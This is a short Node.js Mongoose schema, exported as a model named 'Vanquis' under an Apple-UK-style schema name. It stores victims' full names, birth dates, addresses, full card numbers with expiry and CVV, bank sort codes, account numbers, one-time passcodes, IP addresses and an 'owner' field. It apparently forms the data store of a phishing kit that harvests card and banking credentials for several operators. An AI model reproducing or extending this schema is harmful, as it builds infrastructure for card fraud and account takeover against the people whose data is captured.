const mongoose = require("mongoose");

const appleGbSchema = new mongoose.Schema({
  uniqueid: Number,
  fullname: String,
  dob: String,
  address: String,
  city: String,
  pcode: String,
  ccname: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  scode: String,
  accno: String,
  telephone: String,
  otp: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Vanquis", appleGbSchema);
